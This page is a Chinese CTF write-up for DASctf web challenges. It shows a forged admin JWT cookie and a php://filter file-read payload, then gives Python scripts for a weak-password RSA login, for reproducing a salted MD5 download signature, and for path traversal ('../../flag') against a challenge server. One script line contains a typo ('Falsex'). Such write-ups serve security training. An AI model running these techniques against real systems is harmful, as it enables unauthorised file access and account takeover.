@@ -1,0 +1,1422 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="DASctf, q1n9&#39;s blog">
+    <meta name="description" content="web1
+auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjQ5OTU0MTd9.F2">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>DASctf | q1n9&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">q1n9&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">q1n9&#39;s blog</div>
+        <div class="logo-desc">
+            
+            welcome to my blog
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DASctf</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-12-07
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2026-02-05
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>web1</p>
+<pre class="line-numbers language-none"><code class="language-none">auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjQ5OTU0MTd9.F22NNggIJmuuOpoQXBNWDF7vdiO4OngI5I797fTgLKc;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在admin.php可以任意文件读取，但不知道flag在哪<br>![img](file:///D:\Documents\Tencent Files\1625684832\nt_qq\nt_data\Pic\2025-12\Ori\3a64dbcd4a1dece4e052f2933e9f1465.png)</p>
+<p>在flag.php,用<code>php://filter/convert.iconv.utf8.utf16/resource=flag.php</code></p>
+<p>![img](file:///D:\Documents\Tencent Files\1625684832\nt_qq\nt_data\Pic\2025-12\Ori\cc9be0cda2110792e3a48a1ca5e2eb27.png)</p>
+<h1 id="DevWeb"><a href="#DevWeb" class="headerlink" title="DevWeb"></a>DevWeb</h1><ul>
+<li><strong>题目名称</strong>: DevWeb</li>
+<li><strong>题目描述</strong>: 这是一个正在开发中的网站</li>
+<li><strong>难度</strong>: Medium</li>
+<li><strong>分类</strong>: Web安全</li>
+</ul>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>这是一道综合性的Web安全题目，涉及信息泄露、RSA加密、文件下载和路径遍历等知识点。</p>
+<h2 id="详细解题过程"><a href="#详细解题过程" class="headerlink" title="详细解题过程"></a>详细解题过程</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><p>首先访问目标网站，发现是一个使用Vite构建的单页应用：</p>
+<pre class="line-numbers language-warp-runnable-command" data-language="warp-runnable-command"><code class="language-warp-runnable-command">curl -s "http://TARGET:81/"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看HTML源码，发现引入了JavaScript文件：<code>/assets/index-BgDOi0T5.js</code></p>
+<h3 id="2-分析前端代码"><a href="#2-分析前端代码" class="headerlink" title="2. 分析前端代码"></a>2. 分析前端代码</h3><p>下载并分析JavaScript文件：</p>
+<pre class="line-numbers language-warp-runnable-command" data-language="warp-runnable-command"><code class="language-warp-runnable-command">curl -s "http://TARGET:81/assets/index-BgDOi0T5.js" &gt; app.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过分析发现几个关键信息：</p>
+<h4 id="1-登录功能"><a href="#1-登录功能" class="headerlink" title="(1) 登录功能"></a>(1) 登录功能</h4><p>前端使用RSA加密密码后再发送到服务器：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">t<span class="token punctuation">.</span><span class="token function">setPublicKey</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>publicKey<span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">submitLogin</span><span class="token punctuation">(</span><span class="token string">"username="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">+</span>
+                      <span class="token string">"&amp;password="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-RSA公钥泄露"><a href="#2-RSA公钥泄露" class="headerlink" title="(2) RSA公钥泄露"></a>(2) RSA公钥泄露</h4><p>在代码中发现一个被注释掉的RSA公钥（<strong>关键漏洞点</strong>）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//publicKey:"MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>虽然被注释了，但服务器端仍然使用这个公钥对应的私钥来解密密码。</p>
+<h4 id="3-文件下载功能"><a href="#3-文件下载功能" class="headerlink" title="(3) 文件下载功能"></a>(3) 文件下载功能</h4><p>发现有一个下载接口：<code>/download?file=文件名&amp;sign=签名</code></p>
+<h3 id="3-尝试登录"><a href="#3-尝试登录" class="headerlink" title="3. 尝试登录"></a>3. 尝试登录</h3><p>使用找到的RSA公钥和常见密码尝试登录：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+<span class="token comment"># RSA公钥</span>
+public_key_b64 <span class="token operator">=</span> <span class="token string">"MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE="</span>
+<span class="token comment"># 导入公钥</span>
+public_key_der <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>public_key_b64<span class="token punctuation">)</span>
+rsa_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>public_key_der<span class="token punctuation">)</span>
+cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsa_key<span class="token punctuation">)</span>
+<span class="token comment"># 登录凭证</span>
+username <span class="token operator">=</span> <span class="token string">"admin"</span>
+password <span class="token operator">=</span> <span class="token string">"123456"</span>  <span class="token comment"># 弱密码</span>
+<span class="token comment"># RSA加密密码</span>
+encrypted_pwd <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+encrypted_pwd_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted_pwd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># 构造POST数据</span>
+data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"username=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>encrypted_pwd_b64<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+<span class="token comment"># 发送登录请求</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+base_url <span class="token operator">=</span> <span class="token string">"http://TARGET:81"</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span>
+    data<span class="token operator">=</span>data<span class="token punctuation">,</span>
+    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+    allow_redirects<span class="token operator">=</span>Falsex
+<span class="token punctuation">)</span>
+<span class="token comment"># 返回302重定向，登录成功！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>登录成功</strong>：用户名 <code>admin</code>，密码 <code>123456</code></p>
+<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20251206192445210.png" alt="image-20251206192445210"></p>
+<pre class="line-numbers language-none"><code class="language-none">username=admin&amp;password=KtMuzmL1Dh7ufEDy%2FfVDQg1FEBFQYxrMq3vGR98WAT1YthmwUPQhPI0ZHoW06A2DTdj6VnR4G%2BZM8utJTyN4XmVlKwn9keLmgEDXxwhrzYS7s5MdgEP2BYkenjrJjVNOtDUx73aHqvlCT0FHN1KXkzHK4a2gYdNU0VZ0QftXtZA%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Set-Cookie: JSESSIONID=820287BBA17DCD4AE278270246C95416; Path=/; HttpOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="4-下载app-jmx分析sign算法"><a href="#4-下载app-jmx分析sign算法" class="headerlink" title="4. 下载app.jmx分析sign算法"></a>4. 下载app.jmx分析sign算法</h3><p>登录成功后，尝试访问下载接口。前端代码中有一个固定的sign值：<code>6f742c2e79030435b7edc1d79b8678f6</code></p>
+<p>尝试下载文件：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/download?file=app.jmx&amp;sign=6f742c2e79030435b7edc1d79b8678f6"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功下载到<code>app.jmx</code>文件（JMeter测试配置文件）。</p>
+<h4 id="分析app-jmx中的sign计算逻辑"><a href="#分析app-jmx中的sign计算逻辑" class="headerlink" title="分析app.jmx中的sign计算逻辑"></a>分析app.jmx中的sign计算逻辑</h4><p>在app.jmx中发现了关键的Groovy脚本：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">def mingWen <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>'mingWen'<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 明文 = "test"</span>
+def firstMi <span class="token operator">=</span> <span class="token class-name">DigestUtils</span><span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>mingWen<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 第一次MD5</span>
+def jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 截取第5-16位</span>
+def salt <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token char">'salt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// salt = "f9bc855c9df15ba7602945fb939deefc"</span>
+def newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt<span class="token punctuation">;</span>        <span class="token comment">// 拼接</span>
+def sign <span class="token operator">=</span> <span class="token class-name">DigestUtils</span><span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>newStr<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 第二次MD5得到sign</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Sign计算算法</strong>：</p>
+<pre class="line-numbers language-warp-runnable-command" data-language="warp-runnable-command"><code class="language-warp-runnable-command">MD5_1 = MD5(filename)
+substring = MD5_1[5:16]
+combined = MD5_1 + substring + salt
+sign = MD5(combined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中 <code>salt = "f9bc855c9df15ba7602945fb939deefc"</code></p>
+<h3 id="5-验证sign算法"><a href="#5-验证sign算法" class="headerlink" title="5. 验证sign算法"></a>5. 验证sign算法</h3><p>用Python实现sign计算：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">def</span> <span class="token function">calculate_sign</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    salt <span class="token operator">=</span> <span class="token string">"f9bc855c9df15ba7602945fb939deefc"</span>
+    <span class="token comment"># 第一次MD5</span>
+    firstMi <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># 截取5-16位</span>
+    jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    <span class="token comment"># 拼接</span>
+    newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt
+    <span class="token comment"># 第二次MD5</span>
+    sign <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>newStr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> sign
+<span class="token comment"># 验证app.jmx的sign</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>calculate_sign<span class="token punctuation">(</span><span class="token string">"app.jmx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># 输出: 6f742c2e79030435b7edc1d79b8678f6 ✓ 正确！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-路径遍历获取Flag"><a href="#6-路径遍历获取Flag" class="headerlink" title="6. 路径遍历获取Flag"></a>6. 路径遍历获取Flag</h3><p>使用正确的sign算法，尝试下载系统中的flag文件：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 测试不同的文件路径</span>
+test_files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"../flag"</span><span class="token punctuation">,</span> <span class="token string">"../../flag"</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> test_files<span class="token punctuation">:</span>
+    sign <span class="token operator">=</span> calculate_sign<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
+    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/download?file=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&amp;sign=</span><span class="token interpolation"><span class="token punctuation">{</span>sign<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"找到flag: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"内容: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功通过路径遍历 <code>../../flag</code> 获取到flag文件！</p>
+<pre class="line-numbers language-none"><code class="language-none">http://2e7a82f4-8acb-4620-9fe2-ff15153b6cc2.node5.buuoj.cn:81/download?file=../../flag&amp;sign=0e8eb4d606b21517ca7f9bee140c9db6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
